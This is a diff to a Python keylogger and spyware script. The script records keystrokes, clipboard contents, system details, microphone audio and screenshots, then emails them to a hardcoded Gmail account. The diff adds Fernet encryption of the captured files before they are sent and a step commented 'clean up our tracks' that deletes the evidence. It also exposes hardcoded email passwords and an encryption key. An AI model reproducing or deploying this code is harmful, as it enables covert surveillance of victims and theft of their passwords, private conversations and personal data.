@@ -33,18 +33,30 @@ clipboard_information = "clipboard.txt"
 audio_information = "audio.wav"
 screenshot_information = "screenshot.png"
 
+keys_information_e = "e_key_log.txt"
+system_information_e = "e_systeminfo.txt"
+clipboard_information_e = "e_clipboard.txt"
+
 microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
 
 email_address = "ayeshaloggerproject@gmail.com"
-password = "Baxter.Leo043023"
+password = "P@ssw0rd!!!"
+
+username = getpass.getuser()
+
+
 
 toaddr = "ayeshaloggerproject@gmail.com"
 
+key = "IRGkO4yn44Xi2UobUkHfqTWiEXQxxcJ_DxPa0oGejH0="
+
 file_path = "C:\\Users\\ayesh\\PycharmProjects\\pythonProject9\\Project"
 extend = "\\"
+file_merge = file_path + extend
 
+# email controls
 def send_email(filename, attachment, toaddr):
 
     fromaddr = email_address
@@ -88,7 +100,7 @@ def send_email(filename, attachment, toaddr):
     # Terminating the session
     s.quit()
 
-
+# get the computer information
 def computer_information():
     with open(file_path + extend + system_information, "a") as f:
         hostname = socket.gethostname()
@@ -107,6 +119,7 @@ def computer_information():
 
 computer_information()
 
+#get clipboard
 def copy_clipboard():
     with open(file_path + extend + clipboard_information, "a") as f:
         try:
@@ -120,8 +133,7 @@ def copy_clipboard():
         except:
             f.write("Clipboard could not be copied")
 
-copy_clipboard()
-
+# get microphone
 def microphone():
     fs = 44100
     seconds = microphone_time
@@ -133,16 +145,17 @@ def microphone():
 
 microphone()
 
+# get screenshot
 def screenshot():
     im = ImageGrab.grab()
     im.save(file_path + extend + screenshot_information)
 
-screenshot()
 
 number_of_iterations = 0
 currentTime = time.time()
 stoppingTime = time.time() + time_iteration
 
+# Timer for keylogger
 while number_of_iterations < number_of_iterations_end:
 
 
@@ -187,11 +200,39 @@ while number_of_iterations < number_of_iterations_end:
         with open(file_path + extend + keys_information, "w") as f:
             f.write(" ")
 
+
         screenshot()
         send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
+
         copy_clipboard()
 
         number_of_iterations += 1
 
         currentTime = time.time()
         stoppingTime = time.time() + time_iteration
+
+files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
+encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]
+
+count = 0
+
+for encrypting_file in files_to_encrypt:
+
+    with open(files_to_encrypt[count], 'rb') as f:
+        data = f.read()
+
+    fernet = Fernet(key)
+    encrypted = fernet.encrypt(data)
+
+    with open(encrypted_file_names[0], 'wb') as f:
+        f.write(encrypted)
+
+    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
+    count += 1
+
+time.sleep(120)
+
+# delete files and clean up our tracks
+delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
+for file in delete_files:
+    os.remove(file_merge + file)
